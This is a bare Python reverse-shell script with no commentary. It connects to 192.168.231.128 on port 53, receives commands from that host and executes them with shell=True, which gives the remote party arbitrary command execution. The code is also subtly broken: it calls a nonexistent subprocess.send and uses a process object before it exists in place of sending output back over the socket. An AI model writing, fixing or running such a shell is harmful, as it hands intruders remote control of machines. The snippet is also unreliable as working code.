import socket
import subprocess

s = socket.socket()
s.connect(("192.168.231.128", 53))
while 1:
    p = subprocess.Popen(s.recv(1024),
                         shell=True,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE,
                         stdin=subprocess.send(p.stdout.read() + p.stderr.read()))
